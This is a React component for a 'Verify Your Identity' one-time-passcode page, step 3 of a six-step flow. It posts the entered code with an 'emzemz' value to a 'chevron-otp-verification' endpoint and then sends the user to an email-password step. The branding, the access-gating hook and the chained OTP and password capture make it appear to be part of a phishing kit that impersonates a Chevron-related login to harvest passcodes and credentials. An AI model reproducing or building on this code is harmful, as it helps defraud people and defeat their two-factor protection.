import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const OTP: React.FC = () => {
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Checking access…</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting…</div>;
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError('');

    if (!otp.trim()) {
      setError('One-time passcode is required.');
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/chevron-otp-verification/`, {
        emzemz,
        otp,
      });

      navigate('/email-password', { state: { emzemz } });
    } catch (err) {
      console.error('Error submitting OTP:', err);
      setError('There was a problem verifying your passcode. Please try again.');
      setIsLoading(false);
    }
  };

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing verification details. Please restart the login process.</div>;
  }

  return (
    <FlowPageLayout
      eyebrow="Step 3 of 6"
      title="Verify Your Identity"
      description="Enter the one-time passcode we just sent. This helps us confirm it's really you before continuing."
      contentClassName="space-y-6"
    >
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Passcode</label>
          <input
            id="otp"
            name="otp"
            type="text"
            value={otp}
            onChange={(e) => setOtp(e.target.value.replace(/\s/g, ''))}
            maxLength={10}
            className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm tracking-[0.3em] text-center focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
            placeholder="Enter OTP"
          />
        </div>

        {error && (
          <div className="flex items-center gap-2 text-xs font-semibold text-red-600">
            <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
              <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
            </svg>
            <span>{error}</span>
          </div>
        )}

        <div className="flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="inline-flex items-center justify-center rounded-sm bg-[#003e7d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#002c5c] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isLoading ? 'Verifying…' : 'Verify'}
          </button>
        </div>
      </form>

      <div className="rounded-sm bg-[#f0f6fb] px-4 py-3 text-xs text-[#0e2f56]/80">
        We sent the code to the phone number on file. Didn’t get it? Request another passcode from the previous screen.
      </div>
    </FlowPageLayout>
  );
};

export default OTP;
